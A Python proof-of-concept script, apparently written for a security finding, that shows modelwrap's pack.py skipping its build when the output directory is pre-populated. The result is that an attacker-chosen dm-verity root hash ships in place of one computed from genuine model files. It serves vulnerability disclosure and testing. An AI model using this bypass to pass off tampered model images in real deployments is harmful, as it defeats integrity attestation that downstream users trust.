#!/usr/bin/env python3
"""
Run modelwrap's `pack.py` against a pre-populated output directory
and observe the idempotency check skip the actual build.

modelwrap is normally invoked via Docker; we exec `pack.py` directly
in this process with two runtime patches that let the demo run on a
machine without `mkfs.erofs` and without a HuggingFace token:

  - `huggingface_hub.snapshot_download` is replaced with a no-op (the
    skip path doesn't read model files anyway — it just trusts the
    pre-placed outputs).
  - `huggingface_hub.HfApi.model_info` is patched only for the case
    where the caller didn't supply `@<commit>`.

`pack.py` is not modified on disk.

Reference: Finding M-1 in modelwrap_soundness_finding.md.
"""

import argparse
import io
import os
import runpy
import shutil
import sys
import types

DEFAULT_MODELWRAP_SRC = "/scratch/bjchen4_icgpu/tee_attest/tinfoil/modelwrap"
DEFAULT_OUTPUT_DIR = "./output"
DEFAULT_CACHE_DIR = "./cache"
DEFAULT_MODEL = "meta-llama/Llama-3.2-1B"
DEFAULT_COMMIT = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"


def _install_huggingface_mocks() -> None:
    """Replace huggingface_hub callables that pack.py would otherwise
    invoke against the network."""
    import huggingface_hub

    def fake_snapshot_download(repo_id, *, local_dir=None, token=None, revision=None, **kwargs):
        print(f"[mock] snapshot_download(repo_id={repo_id!r}, "
              f"revision={revision!r}, local_dir={local_dir!r}) — no-op")
        if local_dir:
            os.makedirs(local_dir, exist_ok=True)
        return local_dir

    huggingface_hub.snapshot_download = fake_snapshot_download

    class _FakeApi:
        def __init__(self, *args, **kwargs):
            pass

        def model_info(self, model_name, *args, **kwargs):
            obj = types.SimpleNamespace(sha="deadbeef" * 5)
            return obj

    huggingface_hub.HfApi = _FakeApi


def _run_packpy(modelwrap_src: str, model: str, commit: str,
                cache_dir: str, output_dir: str) -> str:
    """Exec pack.py in this process. Returns stdout content."""
    pack_path = os.path.join(modelwrap_src, "pack.py")
    if not os.path.exists(pack_path):
        raise FileNotFoundError(f"pack.py not found at {pack_path}")

    # pack.py uses environment variables
    os.environ["MODEL"] = f"{model}@{commit}"
    os.environ["CACHE_DIR"] = os.path.abspath(cache_dir)
    os.environ["OUTPUT_DIR"] = os.path.abspath(output_dir)
    os.environ.pop("HF_TOKEN", None)  # not needed under mock

    # Capture stdout
    captured = io.StringIO()
    real_stdout = sys.stdout

    class _Tee:
        def __init__(self, *streams): self.streams = streams
        def write(self, s):
            for s2 in self.streams:
                s2.write(s)
        def flush(self):
            for s2 in self.streams:
                s2.flush()

    sys.stdout = _Tee(real_stdout, captured)
    try:
        runpy.run_path(pack_path, run_name="__main__")
    finally:
        sys.stdout = real_stdout

    return captured.getvalue()


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--modelwrap-src", default=DEFAULT_MODELWRAP_SRC,
                        help=f"Path to modelwrap source tree (default: {DEFAULT_MODELWRAP_SRC})")
    parser.add_argument("--model", default=DEFAULT_MODEL)
    parser.add_argument("--commit", default=DEFAULT_COMMIT)
    parser.add_argument("--cache-dir", default=DEFAULT_CACHE_DIR)
    parser.add_argument("--output-dir", default=DEFAULT_OUTPUT_DIR)
    parser.add_argument("--require-prepopulated", action="store_true",
                        help="Refuse to run unless build_evil_artifacts.py has already populated output/")
    args = parser.parse_args()

    if not os.path.isdir(args.modelwrap_src):
        print(f"error: --modelwrap-src not found: {args.modelwrap_src}", file=sys.stderr)
        return 1

    mpk_path = os.path.join(args.output_dir, args.model, f"{args.commit}.mpk")
    info_path = os.path.join(args.output_dir, args.model, f"{args.commit}.info")

    if args.require_prepopulated and not (os.path.exists(mpk_path) and os.path.exists(info_path)):
        print(
            "error: output not pre-populated. Run build_evil_artifacts.py first.",
            file=sys.stderr,
        )
        return 1

    if os.path.exists(mpk_path) and os.path.exists(info_path):
        print(f"[+] output directory ALREADY contains:")
        print(f"        {mpk_path}  ({os.path.getsize(mpk_path):,} bytes)")
        print(f"        {info_path}  ({os.path.getsize(info_path)} bytes)")
        with open(info_path, "r") as fh:
            pre_contents = fh.read()
        print(f"        info contents BEFORE pack.py: {pre_contents}")
    else:
        print(f"[!] output directory does NOT contain {mpk_path}")
        print("    The skip path will not trigger. Run build_evil_artifacts.py first")
        print("    or pass --require-prepopulated to enforce.")

    print()
    print("=" * 72)
    print(f"Running modelwrap pack.py with MODEL={args.model}@{args.commit}")
    print("=" * 72)

    _install_huggingface_mocks()
    captured = _run_packpy(args.modelwrap_src, args.model, args.commit,
                           args.cache_dir, args.output_dir)

    print()
    print("=" * 72)
    print("Post-run assertions")
    print("=" * 72)

    used_existing_mpk = "Using existing EROFS image" in captured
    used_existing_info = "dm-verity volume already exists" in captured
    print(f"    pack.py said 'Using existing EROFS image':   {used_existing_mpk}")
    print(f"    pack.py said 'dm-verity volume exists':       {used_existing_info}")

    with open(info_path, "r") as fh:
        post_contents = fh.read()
    print(f"    info contents AFTER pack.py:                  {post_contents}")

    print()
    if used_existing_mpk and used_existing_info:
        print("[+] ATTACK CONFIRMED")
        print("    modelwrap exited 0 without invoking mkfs.erofs or veritysetup.")
        print("    The .info file shipped to the downstream consumer contains")
        print("    the attacker's chosen root hash, not a hash computed from")
        print("    legitimate HuggingFace bytes.")
        return 0
    print("[!] skip path did NOT trigger; check pre-population step")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
